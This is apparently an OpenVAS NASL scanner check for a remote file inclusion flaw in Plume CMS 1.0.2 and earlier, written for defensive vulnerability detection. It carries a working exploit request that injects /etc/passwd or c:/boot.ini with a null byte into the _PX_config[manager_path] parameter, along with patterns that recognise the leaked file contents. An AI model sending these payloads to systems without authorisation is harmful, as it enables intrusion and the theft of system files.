# OpenVAS Vulnerability Test
# $Id: plumecms_prepend_file_inclusion.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Plume CMS <= 1.0.2 Remote File Inclusion Vulnerability
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2006 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host is running a PHP application that is prone
to local and remote file inclusion attacks. 

Description :

The system is running Plume CMS a simple but powerful 
content management system.

The version installed does not sanitize user input in the
'_PX_config[manager_path]' parameter in the 'prepend.php' file.
This allows an attacker to include arbitrary files and execute code
on the system.

This flaw is exploitable if PHP's register_globals is enabled.";

tag_solution = "Either sanitize the prepend.php
file as advised by the developer (see first URL) or 
upgrade to Plume CMS version 1.0.3 or later";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.20972");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2006-0725");
 script_bugtraq_id(16662);
 script_xref(name:"OSVDB", value:"23204");
 script_name("Plume CMS <= 1.0.2 Remote File Inclusion Vulnerability");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.plume-cms.net/news/77-Security-Notice-Please-Update-Your-Prependphp-File");
 script_xref(name : "URL" , value : "http://secunia.com/advisories/18883/");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

foreach dir( make_list_unique( "/plume", "/cms", "/", cgi_dirs( port:port ) ) ) {

 if( dir == "/" ) dir = "";
 res = http_get_cache(item:string(dir, "/index.php"), port:port); 
 if(res == NULL) continue;

 if(egrep(pattern:'<a href=[^>]+.*alt="powered by PLUME CMS', string:res)) {

  # Try to grab a local file.
  file[0] = "/etc/passwd";
  file[1] = "c:/boot.ini";

  for(test = 0; file[test]; test++) {

   url = string(dir, "/prepend.php?_PX_config[manager_path]=", file[test], "%00");
   req = http_get(item:url, port:port); 
   recv = http_keepalive_send_recv(data:req, bodyonly:TRUE, port:port);
   if (!recv) continue;

   if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv) ||
       egrep(pattern:"default=multi.*disk.*partition", string:recv) ||
       # And if magic_quotes_gpc = on, check for error messages.
       egrep(pattern:"Warning.+\([^>]+\\0/conf/config\.php.+failed to open stream", string:recv)) {
     report = report_vuln_url( port:port, url:url );
     security_message( port:port, data:report );
     exit( 0 );
   }
  }
 }
}
